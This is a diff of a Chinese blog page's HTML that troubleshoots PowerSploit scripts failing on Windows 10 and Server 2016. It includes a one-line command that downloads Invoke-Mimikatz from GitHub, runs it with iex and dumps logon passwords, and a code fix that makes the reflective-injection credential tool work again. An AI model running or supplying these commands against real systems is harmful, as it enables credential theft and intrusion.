@@ -1,371 +1,77 @@
-<!DOCTYPE html>
-<html lang="zh-CN" dir="ltr">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。">
-<title>powersploit中多个脚本在windows10和server2016上报错</title>
-
-<link rel='canonical' href='http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/'>
-
-<link rel="stylesheet" href="/scss/style.min.b9c8156d464c343bdacaf14a871581fb94cbbdb9dd5cbce4ba017361187cc930.css"><meta property='og:title' content="powersploit中多个脚本在windows10和server2016上报错">
-<meta property='og:description' content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。">
-<meta property='og:url' content='http://localhost:1313/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/'>
-<meta property='og:site_name' content='runshell'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='网络安全' /><meta property='article:tag' content='powersploit' /><meta property='article:published_time' content='2018-07-15T14:30:00&#43;08:00'/><meta property='article:modified_time' content='2018-07-15T14:30:00&#43;08:00'/>
-<meta name="twitter:title" content="powersploit中多个脚本在windows10和server2016上报错">
-<meta name="twitter:description" content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。">
-    </head>
-    <body class="
-    article-page
-    ">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.documentElement.dataset.scheme = 'dark';
-        } else {
-            document.documentElement.dataset.scheme = 'light';
-        }
-    })();
-</script>
-<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header>
-        
-            
-            <figure class="site-avatar">
-                <a href="/">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_hu_a0209d8e65c434cd.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-                </a>
-                
-                    <span class="emoji">🤣</span>
-                
-            </figure>
-            
-        
-        
-        <div class="site-meta">
-            <h1 class="site-name"><a href="/">runshell</a></h1>
-            <h2 class="site-description">Dream is possible!</h2>
-        </div>
-    </header><ol class="menu-social">
-            
-                <li>
-                    <a 
-                        href='https://github.com/runshell'
-                        target="_blank"
-                        title="GitHub"
-                        rel="me"
-                    >
-                        
-                        
-                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
-  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
-</svg>
-
-
-
-                        
-                    </a>
-                </li>
-            
-        </ol><ol class="menu" id="main-menu">
-        
-        
-        
-        <li >
-            <a href='/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>首页</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/about/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>关于</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/archives/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>归档</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='/search/' >
-                
-                
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>搜索</span>
-            </a>
-        </li>
-        
-        
-        <li >
-            <a href='' >
-                
-                
-                
-                <span></span>
-            </a>
-        </li>
-        
-        <li class="menu-bottom-section">
-            <ol class="menu">
-
-                
-                    <li id="dark-mode-toggle">
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                        <span>Dark Mode</span>
-                    </li>
-                
-            </ol>
-        </li>
-    </ol>
-</aside>
-
-    
-
-            <main class="main full-width">
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-    <header class="article-category">
-        
-            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
-                网络安全
-            </a>
-        
-    </header>
-    
-
-    <div class="article-title-wrapper">
-        <h2 class="article-title">
-            <a href="/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/">powersploit中多个脚本在windows10和server2016上报错</a>
-        </h2>
-    
-        
-        <h3 class="article-subtitle">
-            报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。
-        </h3>
-        
-    </div>
-
-    
-    
-    
-    
-    <footer class="article-time">
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
-  <circle cx="18" cy="18" r="4" />
-  <path d="M15 3v4" />
-  <path d="M7 3v4" />
-  <path d="M3 11h16" />
-  <path d="M18 16.496v1.504l1 1" />
-</svg>
-                <time class="article-time--published">Jul 15, 2018</time>
-            </div>
-        
-
-        
-            <div>
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <polyline points="12 7 12 12 15 15" />
-</svg>
-
-
-
-                <time class="article-time--reading">
-                    3 minute read
-                </time>
-            </div>
-        
-    </footer>
-    
-
-    
-</div>
-
-</header>
-
-    <section class="article-content">
-    
-    
-    <p>报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。</p>
-<ul>
-<li>错误信息如下:</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\WINDOWS\system32&gt; iex (New-Object System.Net.WebClient).DownloadString(<span style="color:#e6db74">&#39;https://raw.githubusercontent.com/PowerShe
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span>);Invoke-Mimikatz -Command <span style="color:#e6db74">&#39;&#34;privilege::debug&#34; &#34;sekurlsa::lo
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">gonPasswords full&#34;&#39;</span>
-</span></span><span style="display:flex;"><span>使用<span style="color:#960050;background-color:#1e0010">“</span><span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">”</span>个参数调用<span style="color:#960050;background-color:#1e0010">“</span>GetMethod<span style="color:#960050;background-color:#1e0010">”</span>时发生异常<span style="color:#960050;background-color:#1e0010">:“</span>发现不明确的匹配<span style="color:#960050;background-color:#1e0010">。”</span>
-</span></span><span style="display:flex;"><span>所在位置 行<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">886</span> 字符<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">6</span>
-</span></span><span style="display:flex;"><span>+         $GetProcAddress = $UnsafeNativeMethods.GetMethod(<span style="color:#960050;background-color:#1e0010">&#39;</span>GetProcAddr ...
-</span></span><span style="display:flex;"><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> NotSpecified<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) [], MethodInvocationException
-</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> AmbiguousMatchException
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>不能对 Null 值表达式调用方法<span style="color:#960050;background-color:#1e0010">。</span>
-</span></span><span style="display:flex;"><span>所在位置 行<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">893</span> 字符<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">6</span>
-</span></span><span style="display:flex;"><span>+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
-</span></span><span style="display:flex;"><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> InvalidOperation<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) []<span style="color:#960050;background-color:#1e0010">，</span>RuntimeException
-</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> InvokeMethodOnNull
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>找不到<span style="color:#960050;background-color:#1e0010">“</span>GetDelegateForFunctionPointer<span style="color:#960050;background-color:#1e0010">”</span>的重载<span style="color:#960050;background-color:#1e0010">，</span>参数计数为<span style="color:#960050;background-color:#1e0010">:“</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">”。</span>
-</span></span><span style="display:flex;"><span>所在位置 行<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">489</span> 字符<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">3</span>
-</span></span><span style="display:flex;"><span>+         $VirtualAlloc = [<span style="color:#66d9ef">System.Runtime.InteropServices.Marshal</span>]::Get ...
-</span></span><span style="display:flex;"><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> NotSpecified<span style="color:#960050;background-color:#1e0010">:</span> (<span style="color:#960050;background-color:#1e0010">:</span>) [], MethodException
-</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> MethodCountCouldNotFindBest
-</span></span><span style="display:flex;"><span>.............
-</span></span><span style="display:flex;"><span>...省略n行...
-</span></span><span style="display:flex;"><span>.............
-</span></span></code></pre></div><ul>
-<li><a class="link" href="https://github.com/PowerShellMafia/PowerSploit/issues/293"  target="_blank" rel="noopener"
-    >解决方法</a>：</li>
-</ul>
-<pre tabindex="0"><code>请尝试更改该行：
+<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。"><title>powersploit中多个脚本在windows10和server2016上报错</title>
+<link rel=canonical href=https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="powersploit中多个脚本在windows10和server2016上报错"><meta property='og:description' content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。"><meta property='og:url' content='https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/'><meta property='og:site_name' content='runshell'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='网络安全'><meta property='article:tag' content='powersploit'><meta property='article:published_time' content='2018-07-15T14:30:00+08:00'><meta property='article:modified_time' content='2018-07-15T14:30:00+08:00'><meta name=twitter:title content="powersploit中多个脚本在windows10和server2016上报错"><meta name=twitter:description content="报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。"></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_a0209d8e65c434cd.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🤣</span></figure><div class=site-meta><h1 class=site-name><a href=/>runshell</a></h1><h2 class=site-description>Dream is possible!</h2></div></header><ol class=menu-social><li><a href=https://github.com/runshell target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>首页</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>关于</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>归档</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>搜索</span></a></li><li><a href><span></span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/>网络安全</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/powersploit%E4%B8%AD%E5%A4%9A%E4%B8%AA%E8%84%9A%E6%9C%AC%E5%9C%A8windows10%E5%92%8Cserver2016%E4%B8%8A%E6%8A%A5%E9%94%99/>powersploit中多个脚本在windows10和server2016上报错</a></h2><h3 class=article-subtitle>报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jul 15, 2018</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>3 minute read</time></div></footer></div></header><section class=article-content><p>报错的脚本主要为invoke-reflectivepeinjection.ps1，其它部分脚本由于使用了invoke-reflectivepeinjection.ps1中的代码，所以也报同样的错误,比如Invoke-Mimikatz、invoke-ninjacopy等。</p><ul><li>错误信息如下:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS C:\WINDOWS\system32&gt; iex (New-Object System.Net.WebClient).DownloadString(<span style=color:#e6db74>&#39;https://raw.githubusercontent.com/PowerShe
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>llMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;</span>);Invoke-Mimikatz -Command <span style=color:#e6db74>&#39;&#34;privilege::debug&#34; &#34;sekurlsa::lo
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>gonPasswords full&#34;&#39;</span>
+</span></span><span style=display:flex><span>使用<span style=color:#960050;background-color:#1e0010>“</span><span style=color:#ae81ff>1</span><span style=color:#960050;background-color:#1e0010>”</span>个参数调用<span style=color:#960050;background-color:#1e0010>“</span>GetMethod<span style=color:#960050;background-color:#1e0010>”</span>时发生异常<span style=color:#960050;background-color:#1e0010>:“</span>发现不明确的匹配<span style=color:#960050;background-color:#1e0010>。”</span>
+</span></span><span style=display:flex><span>所在位置 行<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>886</span> 字符<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>6</span>
+</span></span><span style=display:flex><span>+         $GetProcAddress = $UnsafeNativeMethods.GetMethod(<span style=color:#960050;background-color:#1e0010>&#39;</span>GetProcAddr ...
+</span></span><span style=display:flex><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style=display:flex><span>    + CategoryInfo          <span style=color:#960050;background-color:#1e0010>:</span> NotSpecified<span style=color:#960050;background-color:#1e0010>:</span> (<span style=color:#960050;background-color:#1e0010>:</span>) [], MethodInvocationException
+</span></span><span style=display:flex><span>    + FullyQualifiedErrorId <span style=color:#960050;background-color:#1e0010>:</span> AmbiguousMatchException
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>不能对 Null 值表达式调用方法<span style=color:#960050;background-color:#1e0010>。</span>
+</span></span><span style=display:flex><span>所在位置 行<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>893</span> 字符<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>6</span>
+</span></span><span style=display:flex><span>+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...
+</span></span><span style=display:flex><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style=display:flex><span>    + CategoryInfo          <span style=color:#960050;background-color:#1e0010>:</span> InvalidOperation<span style=color:#960050;background-color:#1e0010>:</span> (<span style=color:#960050;background-color:#1e0010>:</span>) []<span style=color:#960050;background-color:#1e0010>，</span>RuntimeException
+</span></span><span style=display:flex><span>    + FullyQualifiedErrorId <span style=color:#960050;background-color:#1e0010>:</span> InvokeMethodOnNull
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>找不到<span style=color:#960050;background-color:#1e0010>“</span>GetDelegateForFunctionPointer<span style=color:#960050;background-color:#1e0010>”</span>的重载<span style=color:#960050;background-color:#1e0010>，</span>参数计数为<span style=color:#960050;background-color:#1e0010>:“</span><span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>”。</span>
+</span></span><span style=display:flex><span>所在位置 行<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>489</span> 字符<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>3</span>
+</span></span><span style=display:flex><span>+         $VirtualAlloc = [<span style=color:#66d9ef>System.Runtime.InteropServices.Marshal</span>]::Get ...
+</span></span><span style=display:flex><span>+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style=display:flex><span>    + CategoryInfo          <span style=color:#960050;background-color:#1e0010>:</span> NotSpecified<span style=color:#960050;background-color:#1e0010>:</span> (<span style=color:#960050;background-color:#1e0010>:</span>) [], MethodException
+</span></span><span style=display:flex><span>    + FullyQualifiedErrorId <span style=color:#960050;background-color:#1e0010>:</span> MethodCountCouldNotFindBest
+</span></span><span style=display:flex><span>.............
+</span></span><span style=display:flex><span>...省略n行...
+</span></span><span style=display:flex><span>.............
+</span></span></code></pre></div><ul><li><a class=link href=https://github.com/PowerShellMafia/PowerSploit/issues/293 target=_blank rel=noopener>解决方法</a>：</li></ul><pre tabindex=0><code>请尝试更改该行：
 $GetProcAddress = $UnsafeNativeMethods.GetMethod(&#39;GetProcAddress&#39;)
 至
 $GetProcAddress = $UnsafeNativeMethods.GetMethod(&#39;GetProcAddress&#39;, [reflection.bindingflags] &#34;Public,Static&#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
-</code></pre><ul>
-<li>报错分析：</li>
-</ul>
-<p>报错的第886行代码为<code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')</code>,它存在如下函数中：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">Function</span> Get-ProcAddress
-</span></span><span style="display:flex;"><span>	{
-</span></span><span style="display:flex;"><span>	    <span style="color:#66d9ef">Param</span>
-</span></span><span style="display:flex;"><span>	    (
-</span></span><span style="display:flex;"><span>	        [OutputType([<span style="color:#66d9ef">IntPtr</span>])]
-</span></span><span style="display:flex;"><span>	    
-</span></span><span style="display:flex;"><span>	        [Parameter( <span style="color:#a6e22e">Position</span> = <span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">Mandatory</span> = $True )]
-</span></span><span style="display:flex;"><span>	        [<span style="color:#66d9ef">String</span>]
-</span></span><span style="display:flex;"><span>	        $Module,
